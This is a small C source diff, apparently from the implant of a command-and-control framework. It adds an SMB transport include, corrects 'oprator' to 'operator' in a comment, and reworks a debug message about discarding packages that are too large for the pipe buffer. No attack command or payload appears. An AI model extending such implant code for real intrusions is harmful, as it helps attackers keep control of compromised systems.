@@ -3,6 +3,7 @@
 #include <Core/MiniStd.h>
 #include <Core/Command.h>
 #include <Core/Transport.h>
+#include <Core/TransportSmb.h>
 
 /* Import Crypto Header (enable CTR Mode) */
 #define CTR    1
@@ -336,8 +337,8 @@ BOOL PackageTransmitAll(
         // TODO: support packet fragmentation
         if ( Pkg->Length > PIPE_BUFFER_MAX )
         {
-            // TODO: notify the oprator that a package was discarded
-            PRINTF( "The package 0x%p is longer than PIPE_BUFFER_MAX, discarding...\n", Pkg )
+            // TODO: notify the operator that a package was discarded
+            PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Pkg->Length )
 
             // remove package from chain
             if ( Prev ) {
